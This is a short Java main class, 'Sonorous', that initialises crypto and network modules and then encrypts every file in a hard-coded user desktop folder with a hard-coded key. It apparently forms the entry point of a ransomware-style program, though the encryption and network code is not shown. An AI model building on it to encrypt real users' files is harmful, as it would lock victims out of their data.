package src.sonorous.build;

import java.io.File;

import src.sonorous.event.*;
import src.sonorous.network.Network;
import src.sonorous.resource.Crypto;
import src.sonorous.resource.FileUtil;

public class Sonorous {
	
	//event handling
	public static CTInvoker cti;
	
	public static void main(String[] args) throws Exception {
		Crypto.init();
		Network.init();
		
		cti = new CTInvoker();
		
		File folder = new File("C:/Users/Sam/Desktop/test");
		String key = "HILARY2K16";
		FileUtil.encryptFiles(folder, key);
	}

}
